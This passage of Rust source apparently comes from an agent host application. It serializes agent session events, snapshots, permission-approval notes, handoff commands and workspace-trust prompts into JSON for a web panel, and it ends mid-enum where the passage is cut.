/// `revisions`, parallel to `events`: each item's seq is its event's post-fold revision minus one.
/// The page uses these tags to advance over requests the host answered and omitted. The range
/// alone does not describe those gaps and is not used to request replay or resync. Reloading the
/// document consumes a fresh snapshot, whose `throughRevision` seeds the page's counter.
/// `tab` names the session tab; the panel drops events unless that tab is active.
pub fn serialize_events_for_js(
    tab: crate::tabs::TabId,
    from_revision: u64,
    through_revision: u64,
    events: &[AgentDomainEvent],
) -> String {
    serialize_events_with_notes_for_js(tab, from_revision, through_revision, events, &CallNotes::default())
}

/// What `TabSet::pump` knows about a tool call that the projection does not, carried beside the
/// events and in snapshots. Only additive fields on the wire, each left out when it says nothing, so
/// a payload without notes is byte-identical to one from before they existed.
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct CallNotes {
    /// Tool-use id -> the saved prefix rule that answered its permission request (`Bash(git log *)`,
    /// shown as the row's note).
    pub allowed_by_rule: BTreeMap<String, String>,
    /// Permission id -> the call's tool-use id, for a `Write` whose file did not exist when its card
    /// was raised: the card says it creates a file rather than warning about
    /// overwriting one it cannot see.
    pub creates_file: BTreeMap<String, Option<String>>,
    /// Tool-use id -> the note for a call whose CLI prompt Eitri answered without a card, so the row
    /// says who answered: "Claude Code asked — allowed in bypass" / "— allowed with your approval".
    pub prompt_notes: BTreeMap<String, String>,
    /// Tool-use ids of a `Write`/`Edit`/`NotebookEdit` the acceptEdits fast path answered without a
    /// card (`agent::permission_policy`'s module doc, "The acceptEdits fast path").
    /// No message of its own -- unlike `allowed_by_rule` there is only one fast path, so the row just
    /// says "allowed by auto" (`tab_set::note_auto_edit_answers`). Recorded where the fast path
    /// answers (`AgentBackend::answer_what_needs_no_human`), never inferred from a missing card
    /// (a missing card is also all that a call which failed before any hook ran leaves behind).
    pub allowed_by_auto: BTreeSet<String>,
    /// Tool-use ids of a `Write` answered `allow` without a card -- by the acceptEdits fast path in
    /// Auto, or in bypass -- over a path where nothing existed just before the answer was sent.
    /// `creates_file` above only ever
    /// learns this from a delivered `PermissionRequested`, which neither answer leaves -- so without
    /// this, such a call kept `creates_file_call` false forever and its row showed the overwrite
    /// warning ("Writes the whole file...") for a file that never existed, exactly backwards. Its
    /// only source is `AgentBackend::answer_what_needs_no_human`'s `AnsweredForYou::creates_file`.
    /// The name (and the wire key `autoCreatesFile`) predate bypass joining it.
    pub auto_creates_file: BTreeSet<String>,
    /// How long each finished turn ran, oldest first (`TurnTime`). The tab keeps every one it
    /// stamped; a batch's notes hold only those that ended in it. The panel's "Worked for" line and
    /// the duration on a turn-ending row read them, so a turn with no entry (history from a resume,
    /// a turn that began before this process) shows no time rather than a wrong one.
    pub turn_times: Vec<TurnTime>,
}

/// When one finished turn started and ended, on the panel's `Date.now()` clock. Both ends are read
/// from the tab's tick, so a turn is at most one tick (about 33 ms) longer than it was.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct TurnTime {
    pub turn_id: String,
    pub started_at_ms: u64,
    pub ended_at_ms: u64,
    /// The `seq` of the newest row when the end was seen: the panel puts the duration line after
    /// that row. `None` when it cannot be told (another turn was already running).
    pub anchor_seq: Option<u64>,
}

impl TurnTime {
    fn to_json(&self) -> Value {
        json!({
            "turnId": self.turn_id,
            "startedAtMs": self.started_at_ms,
            "endedAtMs": self.ended_at_ms,
            "anchorSeq": self.anchor_seq,
        })
    }
}

impl CallNotes {
    pub fn is_empty(&self) -> bool {
        self.allowed_by_rule.is_empty()
            && self.creates_file.is_empty()
            && self.prompt_notes.is_empty()
            && self.allowed_by_auto.is_empty()
            && self.auto_creates_file.is_empty()
            && self.turn_times.is_empty()
    }

    /// Whether this tool-use id's `Write` created its file (see `creates_file` and, for the
    /// fast-path case a card never raised, `auto_creates_file`).
    fn creates_file_call(&self, tool_use_id: &str) -> bool {
        self.creates_file.values().any(|id| id.as_deref() == Some(tool_use_id))
            || self.auto_creates_file.contains(tool_use_id)
    }
}

/// [`serialize_events_for_js`], plus what `notes` says about this batch:
/// `"ruleNotes":[{"toolUseId":..,"rule":"Bash(git log *)"}]`,
/// `"createsFile":[{"permissionId":..,"toolUseId":..|null}]`,
/// `"autoNotes":["toolu_..", ...]`, and
/// `"autoCreatesFile":["toolu_..", ...]` (a bypass `Write` too), and `"turnTimes":[{"turnId":..,"startedAtMs":..,"endedAtMs":..,"anchorSeq":..|null}]`
/// for the turns that ended in this batch. Each is left out when empty.
pub fn serialize_events_with_notes_for_js(
    tab: crate::tabs::TabId,
    from_revision: u64,
    through_revision: u64,
    events: &[AgentDomainEvent],
    notes: &CallNotes,
) -> String {
    serialize_events_with_notes_and_revisions_for_js(tab, from_revision, through_revision, events, notes, None)
}

/// Like the notes envelope, with one post-fold revision per delivered event when tags are known.
/// The tags preserve item sequence numbers when the host omits requests it answered itself.
pub fn serialize_events_with_notes_and_revisions_for_js(
    tab: crate::tabs::TabId,
    from_revision: u64,
    through_revision: u64,
    events: &[AgentDomainEvent],
    notes: &CallNotes,
    revisions: Option<&[u64]>,
) -> String {
    if let Some(revisions) = revisions {
        assert_eq!(
            events.len(),
            revisions.len(),
            "each delivered event needs its fold revision"
        );
    }
    let mut payload = json!({
        "kind": "events",
        "tab": tab.0,
        "fromRevision": from_revision,
        "throughRevision": through_revision,
        "events": events
    });
    if let Some(revisions) = revisions {
        payload["revisions"] = json!(revisions);
    }
    if !notes.allowed_by_rule.is_empty() {
        payload["ruleNotes"] = notes
            .allowed_by_rule
            .iter()
            .map(|(tool_use_id, rule)| json!({ "toolUseId": tool_use_id, "rule": rule }))
            .collect();
    }
    if !notes.prompt_notes.is_empty() {
        payload["promptNotes"] = notes
            .prompt_notes
            .iter()
            .map(|(tool_use_id, note)| json!({ "toolUseId": tool_use_id, "note": note }))
            .collect();
    }
    if !notes.creates_file.is_empty() {
        payload["createsFile"] = notes
            .creates_file
            .iter()
            .map(|(permission_id, tool_use_id)| json!({ "permissionId": permission_id, "toolUseId": tool_use_id }))
            .collect();
    }
    if !notes.allowed_by_auto.is_empty() {
        payload["autoNotes"] = notes.allowed_by_auto.iter().cloned().collect();
    }
    if !notes.auto_creates_file.is_empty() {
        payload["autoCreatesFile"] = notes.auto_creates_file.iter().cloned().collect();
    }
    if !notes.turn_times.is_empty() {
        payload["turnTimes"] = notes.turn_times.iter().map(TurnTime::to_json).collect();
    }
    payload.to_string()
}

/// Everything one snapshot needs, gathered from wherever it actually lives.
///
/// Exists so the serializer stays a pure function of plain data: it can be unit-tested against a
/// hand-built view without constructing a real `AgentBackend`, which would mean spawning a real
/// sidecar process. `SnapshotView::of` is the one place the gathering happens, so the two can never
/// disagree about where a field comes from.
pub struct SnapshotView<'a> {
    pub backend: &'static str,
    pub conversation_id: Option<&'a str>,
    /// Verdandi's session id, from the backend rather than the projection -- the projection does not
    /// learn it until the first `SessionOpened`, which on the sidecar path is not until the first
    /// turn.
    pub session_id: Option<&'a str>,
    pub provider_session_id: Option<String>,
    pub capabilities: agent::ProviderCapabilities,
    pub provider: Option<&'a agent::ProviderInfo>,
    /// Borrowed, not cloned. On the sidecar path this is a live borrow through the ingestion
    /// thread's lock, so a snapshot is serialized directly out of canonical state rather than from a
    /// copy of a whole conversation.
    pub projection: crate::agent_backend::ProjectionRef<'a>,
    /// Permission ids `serialize_snapshot_for_js` must omit from `pendingPermissions`:
    /// requests Eitri itself already answered (`Tab::host_answered`) and is waiting on the
    /// provider's resolution for. `None` only in tests that build a bare `SnapshotView` literal
    /// directly and have no such set to hide.
    pub hidden_pending: Option<&'a BTreeSet<String>>,
}

impl<'a> SnapshotView<'a> {
    /// `hidden` is `Tab::host_answered`: every id in it is dropped from `pendingPermissions` (never
    /// from tool calls or the transcript) so a request Eitri answered on the user's behalf never
    /// draws a card, and the tray never counts it either.
    pub fn of(backend: &'a crate::agent_backend::AgentBackend, hidden: &'a BTreeSet<String>) -> Self {
        Self {
            // An external agent runs on neither Claude backend.
            backend: backend
                .kind()
                .map_or("external", crate::agent_backend::BackendKind::as_str),
            conversation_id: backend.conversation_id(),
            session_id: backend.session_id(),
            provider_session_id: backend.provider_session_id(),
            capabilities: backend.capabilities(),
            provider: backend.provider_info(),
            projection: backend.projection(),
            hidden_pending: Some(hidden),
        }
    }
}

/// `{"kind":"snapshot","tab":...,"throughRevision":...,"state":<AgentUiState-shaped JSON>}` -- a
/// hand-written re-shaping of `AgentSessionProjection`'s snake_case Rust fields into the camelCase
/// shape `agent-ui/web/src/types.ts`'s `AgentUiState` expects (deliberately not a direct
/// `#[derive(Serialize)]` passthrough -- the TS and Rust naming conventions differ, and this
/// function is the one place that difference is bridged).
///
/// Takes a `SnapshotView` rather than the projection alone, because two of the three identities
/// live outside it: `conversationId` is Eitri's own and `providerSessionId` is Claude's, while the
/// projection's `sessionId` is Verdandi's. Collapsing them would defeat the entire point of keeping
/// them apart -- and would eventually send Claude's id back as a session_id, which the sidecar
/// answers with SESSION_NOT_FOUND. `tab` names the session tab it is about; the panel drops it
/// unless that tab is active, the only one it draws.
pub fn serialize_snapshot_for_js(
    tab: crate::tabs::TabId,
    view: &SnapshotView<'_>,
    turn_started_at_ms: Option<u64>,
) -> String {
    serialize_snapshot_with_notes_for_js(tab, view, turn_started_at_ms, &CallNotes::default(), &[])
}

/// [`serialize_snapshot_for_js`], with what `notes` says so a reload or a tab switch keeps it:
/// `allowedByRule` on each tool call a saved prefix rule answered,
/// `createsFile: true` on a `Write` card, and on its tool call, whose file did not exist when the
/// card was raised OR when a card was never raised at all because the acceptEdits fast path
/// answered it (`CallNotes::creates_file_call`), and `allowedByAuto: true` on
/// a `Write`/`Edit`/`NotebookEdit` the acceptEdits fast path answered. Absent on
/// every other entry, as in the events payload. `cards` are the tab's broker cards, which no projection holds:
/// `editorCards`, left out when there are none.
pub fn serialize_snapshot_with_notes_for_js(
    tab: crate::tabs::TabId,
    view: &SnapshotView<'_>,
    turn_started_at_ms: Option<u64>,
    notes: &CallNotes,
    cards: &[crate::editor_tools::cards::EditorCardWire],
) -> String {
    let projection = &*view.projection;
    // Written out for the same stated reason as `transcript` just below: both field names happen
    // to be single lowercase words today, so the derive would produce the same JSON, but this
    // function exists precisely because Rust and TS name things differently and a field added
    // later would otherwise reach the frontend in whatever spelling Rust used.
    let user_prompts: Vec<Value> = projection
        .user_prompts
        .iter()
        .map(|prompt| {
            // `delivered` only when true: a message read inside the running turn. Every other prompt
            // keeps the shape it always had.
            if prompt.delivered {
                json!({ "seq": prompt.seq, "text": prompt.text, "delivered": true })
            } else {
                json!({ "seq": prompt.seq, "text": prompt.text })
            }
        })
        .collect();

    // Written out rather than leaning on `TranscriptMessage`'s derive. Both field names happen to
    // be single lowercase words, so the derive would produce the same JSON today -- but this
    // function exists precisely because Rust and TS name things differently, and a field added to
    // that struct later would otherwise reach the frontend in whatever spelling Rust used.
    let transcript: Vec<Value> = projection
        .transcript
        .iter()
        .map(|message| json!({ "seq": message.seq, "text": message.text }))
        .collect();

    let tool_calls: Vec<Value> = projection
        .tool_calls
        .iter()
        .map(|call| {
            let mut entry = json!({
                // Where this call sits among the assistant messages and permission cards. Without
                // it the frontend had three collections and no way to interleave them, so every
                // tool card rendered below every message. See `AgentSessionProjection::apply`.
                "seq": call.seq,
                // The turn it started in: a `null` result whose turn is no longer the active one
                // can never arrive, and the panel stops drawing it as running (sw-panel-render-6).
                "turnId": call.turn_id,
                "toolUseId": call.tool_use_id,
                "name": call.name,
                "input": call.input,
                "result": call.result.as_ref().map(|r| json!({ "content": r.content, "isError": r.is_error })),
            });
            if let Some(rule) = notes.allowed_by_rule.get(&call.tool_use_id) {
                entry["allowedByRule"] = json!(rule);
            }
            if notes.creates_file_call(&call.tool_use_id) {
                entry["createsFile"] = json!(true);
            }
            if notes.allowed_by_auto.contains(&call.tool_use_id) {
                entry["allowedByAuto"] = json!(true);
            }
            if let Some(note) = notes.prompt_notes.get(&call.tool_use_id) {
                entry["promptNote"] = json!(note);
            }
            // The CLI's own refusal of this call, from the projection itself (not a note: it is the
            // provider's fact, not this host's bookkeeping). Absent on every call nobody refused,
            // as in the events payload's `permission_denied`.
            if let Some(denied) = &call.denied {
                entry["denied"] = json!({ "reasonType": denied.reason_type, "reason": denied.reason });
            }
            // How the input the CLI's own prompt carried differs from the one the gate judged
            // (`ToolCallRecord::changed_input`, bounded). Absent when they agree and when nothing
            // could be compared; the same shape as the events payload's `tool_input_changed`.
            if let Some(changed) = &call.changed_input {
                entry["changedInput"] = serde_json::to_value(changed).unwrap_or(Value::Null);
            }
            entry
        })
        .collect();

    // `toolUseId` is the link back to the tool call a request gates. It stays genuinely nullable
    // even though every path in both backends now reads whatever id its own message carried: the
    // id can still be absent (a `can_use_tool` request without the field, a provider that sends an
    // empty string, which `projection::tool_use_link` turns into `None`), and this pane must render
    // that honestly rather than guessing at the most recent call. Emitted as an explicit `null`
    // rather than omitted, so the frontend can tell "no id was sent for this request" from "this
    // build predates the field".
    //
    // Sorted by `seq`, which is also the order they were requested in. `pending_permissions` is a
    // `HashMap` and `values()` order is unspecified, so without this two snapshots of one state
    // could emit two different card orders.
    let mut pending: Vec<&agent::PermissionRequestRecord> = projection
        .pending_permissions
        .values()
        .filter(|p| {
            !view
                .hidden_pending
                .is_some_and(|hidden| hidden.contains(&p.permission_id))
        })
        .collect();
    pending.sort_by_key(|p| p.seq);
    let pending_permissions: Vec<Value> = pending
        .into_iter()
        .map(|p| {
            let mut entry = json!({
                // Where this card sits in the conversation. Used when it has no `toolUseId` to
                // anchor it beside its tool call -- which is every card on the legacy backend.
                "seq": p.seq,
                "permissionId": p.permission_id,
                "toolUseId": p.tool_use_id,
                "toolName": p.tool_name,
                "input": p.input,
            });
            if notes.creates_file.contains_key(&p.permission_id) {
                entry["createsFile"] = json!(true);
            }
            // The CLI's own prompt, with its words, so a reload or a tab switch keeps the
            // reason its card was drawn for. Absent on the gate's own request, as on the events path
            // (where the event itself carries `provider_prompt` in snake_case).
            if let Some(prompt) = &p.provider_prompt {
                entry["providerPrompt"] = json!({
                    "reason": prompt.reason,
                    "description": prompt.description,
                    "blockedPath": prompt.blocked_path,
                    "unrecognizedOrigin": prompt.unrecognized_origin,
                    "matchedAskRule": prompt.matched_ask_rule.as_ref().map(|rule| json!({
                        "source": rule.source,
                        "toolName": rule.tool_name,
                        "ruleContent": rule.rule_content,
                    })),
                });
            }
            entry
        })
        .collect();

    let status = match &projection.status {
        agent::ProjectionStatus::Starting => json!({ "kind": "starting" }),
        agent::ProjectionStatus::Running => json!({ "kind": "running" }),
        agent::ProjectionStatus::Unavailable { reason } => json!({ "kind": "unavailable", "reason": reason }),
        agent::ProjectionStatus::Closed { reason } => json!({ "kind": "closed", "reason": reason }),
    };

    let capabilities = view.capabilities;
    let provider = view.provider.map(|info| {
        json!({
            "sidecarVersion": info.sidecar_version,
            "claudeAgentSdkVersion": info.claude_agent_sdk_version,
            "claudeCodeVersion": info.actual_claude_code_version,
            "protocol": format!("{}.{}", info.protocol_major, info.protocol_minor),
            "buildDescription": info.build_description,
            "startupDiagnostics": info.startup_diagnostics,
        })
    });

    // What this conversation was seeded with before it took its first live event, or `null` on a
    // fresh session. Emitted as an explicit `null` rather than omitted, so the panel can tell "this
    // session restored nothing" from "this build predates the field".
    //
    // `uptoSeq` is the only field here the panel needs for anything other than its notice row: it is
    // the boundary between what was restored and what this session produced, and a tool call below
    // it with no result can never complete -- rendering that as `Running…` would be a spinner on a
    // process that has been gone for days.
    let history = projection.history.as_ref().map(|notice| {
        json!({
            "source": match notice.source {
                agent::HistorySource::ClaudeTranscript => "claude_transcript",
                agent::HistorySource::EitriCopy => "eitri_copy",
            },
            "restoredItems": notice.restored_items,
            "omittedItems": notice.omitted_items,
            "uptoSeq": notice.upto_seq,
            "sourcePath": notice.source_path,
            "attemptedTranscriptPath": notice.attempted_transcript_path,
            "fallbackReason": notice.fallback_reason,
            "writerVersion": notice.writer_version,
        })
    });

    // Turns that did not complete, each where it ended, spelled out for the same reason as the
    // collections above.
    let turn_endings: Vec<Value> = projection
        .turn_endings
        .iter()
        .map(|ending| {
            let mut row = json!({
                "seq": ending.seq,
                "turnId": ending.turn_id,
                "kind": ending.kind,
                "reason": ending.detail.reason,
                "apiErrorStatus": ending.detail.api_error_status,
                "message": ending.detail.message,
                "resetsAt": ending.resets_at,
            });
            if let Some(origin) = &ending.detail.origin_kind {
                row["originKind"] = json!(origin);
            }
            if let Some(count) = ending.detail.num_turns {
                row["numTurns"] = json!(count);
            }
            row
        })
        .collect();

    // The agent's thinking, block by block, spelled out like the collections above. Plain text: the
    // panel never renders it as markdown.
    let thinking: Vec<Value> = projection
        .thinking
        .iter()
        .map(|block| json!({ "seq": block.seq, "turnId": block.turn_id, "text": block.text }))
        .collect();

    let mut state = json!({
        "backend": view.backend,
        "history": history,
        // Three identities, three fields. Never one.
        "conversationId": view.conversation_id,
        "sessionId": view.session_id,
        "providerSessionId": view.provider_session_id,
        "model": projection.model,
        "cwd": projection.cwd,
        "userPrompts": user_prompts,
        "transcript": transcript,
        "toolCalls": tool_calls,
        "turnEndings": turn_endings,
        // How the latest turn ended when it did not complete, until the next one starts: the
        // band's segment. `null` while a turn runs and after one that completed.
        "lastTurnEnding": projection.last_turn_ending,
        "status": status,
        "activeTurnId": projection.active_turn_id,
        "pendingPermissions": pending_permissions,
        // sw-panel-render-2 (2026-09-27): this used to be missing entirely, and `applySnapshot`
        // forced its own copy of the flag to `false` regardless -- but this projection keeps
        // appending to the open message underneath a snapshot taken mid-reply, so the two sides
        // disagreed about whether the last transcript entry was still open. Sending the real bit
        // is what lets `applySnapshot` take it from the wire instead of guessing "closed".
        "assistantMessageOpen": projection.assistant_message_open,
        "thinking": thinking,
        // Whether the last block is still being written, for the same reason as the bit above: a
        // snapshot taken mid-thought must not split the thought, or draw it as finished.
        "thinkingOpen": projection.thinking_open,
        // The tab's last reported usage, so a tab switch or a panel reload
        // shows the figure the band draws without waiting for the next turn to report one. An
        // explicit `null` until a provider has reported something (never a zeroed object), then
        // `agent::UsageInfo` as it derives: SNAKE_CASE inside, the same shape the `turn_completed`
        // event carries -- the one place in `state` that is not camelCase, so the panel folds a
        // live report and a snapshot's copy with one type (`types.ts`'s `UsageInfo`).
        "usage": projection.usage,
        // The account's usage limit as the agent last reported it, `null` before any report. Account-wide,
        // but the snapshot is the only way a reloaded panel learns it before the next report.
        // How many commands the agent left running after its turns ended (0 when none, and for every
        // agent that keeps no such count): the band's count and what `<leader>k` would stop.
        "backgroundCalls": projection.background_calls,
        "accountLimits": projection.account_limits.as_ref().map(|limits| json!({
            "usedPercent": limits.used_percent,
            "windowMinutes": limits.window_minutes,
            "resetsAt": limits.resets_at,
            "plan": limits.plan,
        })),
        // The slash commands the agent listed (`{name, description, hint?}`), `null` before any list -- the
        // page then falls back to what it knows of the agent. The text is the agent's own and bounded at
        // the producer; the page draws it as plain text.
        "availableCommands": projection.available_commands,
        "capabilities": {
            "resume": capabilities.resume,
            "fork": capabilities.fork,
            "interrupt": capabilities.interrupt,
            "bypassPermissionMode": capabilities.bypass_permission_mode,
            // What Enter does while a turn runs: puts the message into the turn, or holds it for the end.
            "steer": capabilities.steer,
            // No `modeSwitch` since 2026-09-27: nothing switches a live session's CLI mode any
            // more; the tab's own mode is local to the host.
        },
        "provider": provider,
    });
    // Absence is an unavailable control, including snapshots from peers predating task reporting.
    for (name, offered) in [
        ("backgroundTasks", capabilities.background_tasks),
        ("taskControl", capabilities.task_control),
        ("taskOutput", capabilities.task_output),
        ("taskOutputRange", capabilities.task_output_range),
        ("directSettings", capabilities.direct_settings),
        ("workflowProgress", capabilities.workflow_progress),
    ] {
        if offered {
            state["capabilities"][name] = json!(true);
        }
    }
    projection.snapshot_modules(&mut state);
    if !cards.is_empty() {
        state["editorCards"] = json!(cards);
    }

    // Changes whose call has not started (Rust holds them and attaches them when it does): sent only
    // while there are any, so a page rebuilt from this snapshot attaches them at the same moment.
    if !projection.changed_inputs_before_their_call.is_empty() {
        state["changedInputsBeforeTheirCall"] = projection
            .changed_inputs_before_their_call
            .iter()
            .map(|(id, change)| json!({ "toolUseId": id, "change": change }))
            .collect();
    }

    // The starts of turns the user did not send, the CLI's notice rows and Claude's question sets,
    // spelled out like the collections above. Each only while the projection holds any, so the
    // snapshot of a conversation without them is what it was before they existed; the page reads a
    // missing one as empty.
    if !projection.turn_starts.is_empty() {
        state["turnStarts"] = projection.turn_starts.iter().map(turn_start_json).collect();
    }
    if !projection.notices.is_empty() {
        state["notices"] = projection.notices.iter().map(notice_json).collect();
    }
    // Claude Code is working where the panel cannot show it: sent only while it is, for the same
    // reason, and a page reads a missing key as not.
    if projection.cli_unseen_busy {
        state["cliUnseenBusy"] = Value::Bool(true);
    }
    // Which prompt the running turn opened with, and whether Claude Code started that turn: sent only
    // while set, so a page rebuilt mid-turn moves the same prompt aside and drops the same empty turn.
    if let Some(seq) = projection.opening_prompt {
        state["openingPromptSeq"] = json!(seq);
    }
    if projection.running_turn_cli {
        state["runningTurnCli"] = Value::Bool(true);
    }

    // When the running turn started (wall clock ms, `Date.now()`'s clock), which the tab set keeps
    // per tab so a switch or a reload shows the turn's real elapsed time rather than `0s+`. On the
    // envelope, not in `state`: it is the tab's, not the projection's. `null` when no turn runs.
    json!({
        "kind": "snapshot",
        "tab": tab.0,
        "throughRevision": projection.last_revision,
        "state": state,
        "turnStartedAtMs": turn_started_at_ms,
        // How long every finished turn of this tab ran (`CallNotes::turn_times`): the panel replaces
        // its whole table with this list, so a turn absent here shows no duration.
        "turnTimes": notes.turn_times.iter().map(TurnTime::to_json).collect::<Vec<_>>(),
    })
    .to_string()
}

fn turn_start_json(start: &agent::TurnStartRecord) -> Value {
    json!({
        "seq": start.seq,
        "turnId": start.turn_id,
        "origin": start.origin,
        "cause": start.cause.as_ref().map(|cause| {
            let mut value = json!({
                "kind": cause.kind,
                "taskId": cause.task_id,
                "taskKind": cause.task_kind,
                "taskStatus": cause.task_status,
                "description": cause.description,
                "summary": cause.summary,
                "peerName": cause.peer_name,
                "text": cause.text,
                "wakeupSource": cause.wakeup_source,
                "scheduledForMs": cause.scheduled_for_ms,
                "scheduleReason": cause.schedule_reason,
                "cronId": cause.cron_id,
                "prompt": cause.prompt,
            });
            if let Some(id) = &cause.tool_use_id {
                value["toolUseId"] = json!(id);
            }
            value
        }),
    })
}

fn notice_json(notice: &agent::NoticeRecord) -> Value {
    json!({
        "seq": notice.seq,
        "kind": notice.kind,
        "level": notice.level,
        "content": notice.content,
        "scalars": notice.scalars,
        "taskId": notice.task_id,
        "toolUseId": notice.tool_use_id,
        "taskStatus": notice.task_status,
    })
}

/// `{"kind":"handoff","tab":...,"command":...,"cwd":...,"providerSessionId":...}` -- the
/// conversation has been closed here and this is the command that continues it in the user's own
/// terminal.
///
/// Dispatched only AFTER the real session shutdown has completed (`agent_panel`'s
/// `collect_pending_handoff`), so the ordering a handoff needs -- close and flush before the CLI
/// starts, so the CLI resumes a complete transcript that nobody else is writing -- holds by
/// construction rather than by hope: the command has not been shown yet while Eitri is still
/// driving the session.
///
/// `providerSessionId` is read back out of the command's own argv rather than passed in beside it,
/// so the id the panel displays and the id the command resumes are the same value by construction.
///
/// **It carries no claim of exclusivity, because there is none to make.** Nothing was spawned and
/// no lease was taken; the frontend renders a concurrency warning on this path, because two CLIs
/// resuming one session interleave its transcript, and even a held lease could not stop another
/// `claude` of the same user from writing it, with no lock both sides honour. `tab` names the
/// session tab it is about; the panel drops it unless that tab is active, the only one it draws.
pub fn serialize_handoff_for_js(tab: crate::tabs::TabId, command: &agent::handoff::ClaudeResumeCommand) -> String {
    json!({
        "kind": "handoff",
        "tab": tab.0,
        "command": command.shell_command_line(),
        "cwd": command.cwd(),
        // Read back out of the command's own argv by `ClaudeResumeCommand::provider_session_id`,
        // which is total rather than indexing -- a malformed argv cannot panic the whole shell
        // process over one envelope.
        "providerSessionId": command.provider_session_id(),
    })
    .to_string()
}

/// `{"kind":"error","tab":...,"message":<message>}` -- a fatal, session-ending failure the frontend
/// cannot otherwise detect (e.g. `AgentSession::start` failing because `claude` isn't on `PATH`).
/// Distinct from `command_result`'s `ok:false` (which reports one command's own failure without
/// ending the session) -- this envelope means the whole `AgentSession` is gone. `tab` names the
/// session tab it is about; the panel drops it unless that tab is active, the only one it draws.
pub fn serialize_error_for_js(tab: crate::tabs::TabId, message: &str) -> String {
    json!({ "kind": "error", "tab": tab.0, "message": message }).to_string()
}

/// Whether answering the trust question with `y` is remembered, and for how long.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustRememberView {
    /// A record on disk.
    Yes,
    /// This window only: no record could be kept.
    Window,
    /// This one start only: something could not be checked.
    Session,
}

impl TrustRememberView {
    fn as_str(self) -> &'static str {
        match self {
            TrustRememberView::Yes => "yes",
            TrustRememberView::Window => "window",
            TrustRememberView::Session => "session",
        }
    }
}

/// Why the question is being asked.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustPromptState {
    Untrusted,
    Changed,
    /// Nothing of the agent's was found, and the agent still starts only after a `y` (a registered
    /// agent, which loads whatever project files appear).
    Nothing,
    /// The configuration is too large to show whole, so there is nothing to trust: the question takes
    /// only `n` (start without it) or `Escape` (put the start off), and `y` is never taken.
    TooLarge,
}

impl TrustPromptState {
    fn as_str(self) -> &'static str {
        match self {
            TrustPromptState::Untrusted => "untrusted",
            TrustPromptState::Changed => "changed",
            TrustPromptState::Nothing => "nothing",
            TrustPromptState::TooLarge => "too_large",
        }
    }
}

/// What changed since the answer was recorded, as paths relative to the top of the walk.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct TrustDiffView {
    pub added: Vec<String>,
    pub removed: Vec<String>,
    pub changed: Vec<String>,
}

/// One thing the prompt shows. `value` is the raw text and is shown whole: a value cut for display
/// would let a `y` approve text nobody saw (a configuration file is already capped at 4 MiB, and the
/// page scrolls).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TrustItemView {
    pub what: &'static str,
    pub file: String,
    pub label: String,
    pub value: String,
    pub outside: bool,
}

/// The question a tab waits on, in the words the page draws.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TrustPromptView {
    pub tab: crate::tabs::TabId,
    pub nonce: u64,
    /// Whose configuration the question is about, as a person reads it: `Claude`, `Codex`, or a
    /// registered agent's own name.
    pub agent: String,
    pub root: String,
    pub top: String,
    /// The shown discovery's fingerprint, in hex.
    pub fingerprint: String,
    pub state: TrustPromptState,
    /// Whether an `n` refuses the start rather than starting without the project's configuration: true
    /// for an agent that cannot be started without loading it.
    pub needs_yes: bool,
    pub remember: TrustRememberView,
    pub remember_note: Option<String>,
    pub changed: Option<TrustDiffView>,
    pub items: Vec<TrustItemView>,
}

/// Everything the page shows of a trust prompt, in the order the digest hashes it. Field order is the
/// serialization order, so it is part of what the digest means.
#[derive(Serialize)]
struct TrustShown<'a> {
    agent: &'a str,
    root: &'a str,
    top: &'a str,
    fingerprint: &'a str,
    state: &'static str,
    #[serde(rename = "needsYes")]
    needs_yes: bool,
    remember: &'static str,
    #[serde(rename = "rememberNote")]
    remember_note: Option<&'a str>,
    changed: Option<&'a TrustDiffView>,
    items: Vec<Value>,
}

impl TrustPromptView {
    fn shown(&self) -> TrustShown<'_> {
        TrustShown {
            agent: &self.agent,
            root: &self.root,
            top: &self.top,
            fingerprint: &self.fingerprint,
            state: self.state.as_str(),
            needs_yes: self.needs_yes,
            remember: self.remember.as_str(),
            remember_note: self.remember_note.as_deref(),
            changed: self.changed.as_ref(),
            items: self
                .items
                .iter()
                .map(|item| {
                    json!({
                        "what": item.what,
                        "file": item.file,
                        "label": item.label,
                        "value": item.value,
                        "outside": item.outside,
                    })
                })
                .collect(),
        }
    }

    /// The sha256 (64 hex) of the compact JSON of everything the page shows -- `agent`, `root`, `top`,
    /// `fingerprint`, `state`, `needsYes`, `remember`, `rememberNote`, `changed`, `items`, in that order, every
    /// value whole -- and not `tab` or `nonce`. An answer echoing it is an answer about
    /// this text, not only about the bytes on disk.
    pub fn findings_digest(&self) -> String {
        use sha2::{Digest, Sha256};
        let compact = serde_json::to_string(&self.shown()).expect("a prompt's own fields always serialize");
        let digest = Sha256::digest(compact.as_bytes());
        digest.iter().map(|byte| format!("{byte:02x}")).collect()
    }
}

/// `{"kind":"trust_prompt","tab":...,"nonce":...,"agent":...,"root":...,"top":...,"fingerprint":...,
/// "findingsDigest":...,"state":...,"needsYes":...,"remember":...,"rememberNote":...,"changed":...,
/// "items":[...]}` --
/// the question a tab waits on before its session may load the project's own configuration for
/// `agent` (Claude's, Codex's, a registered agent's).
/// Values are sent raw (serde escapes them); the page reveals hidden characters. `tab` names the tab
/// it is about; the panel drops it unless that tab is active.
pub fn serialize_trust_prompt_for_js(view: &TrustPromptView) -> String {
    let shown = view.shown();
    json!({
        "kind": "trust_prompt",
        "tab": view.tab.0,
        "nonce": view.nonce,
        "agent": shown.agent,
        "root": shown.root,
        "top": shown.top,
        "fingerprint": shown.fingerprint,
        "findingsDigest": view.findings_digest(),
        "state": shown.state,
        "needsYes": shown.needs_yes,
        "remember": shown.remember,
        "rememberNote": shown.remember_note,
        "changed": shown.changed,
        "items": shown.items,
    })
    .to_string()
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TabStateWire {
    NotStarted,
    Starting,
    /// A start (a first send, a resume or a restore) put off until the user answers the workspace-trust
    /// question: no session is being opened, so the panel must not say one is starting.
    AwaitingTrust,
    Live,
    Ended,
    Failed,
}

impl TabStateWire {
    pub fn as_str(self) -> &'static str {
        match self {
            TabStateWire::NotStarted => "not_started",
            TabStateWire::Starting => "starting",
            TabStateWire::AwaitingTrust => "awaiting_trust",
            TabStateWire::Live => "live",
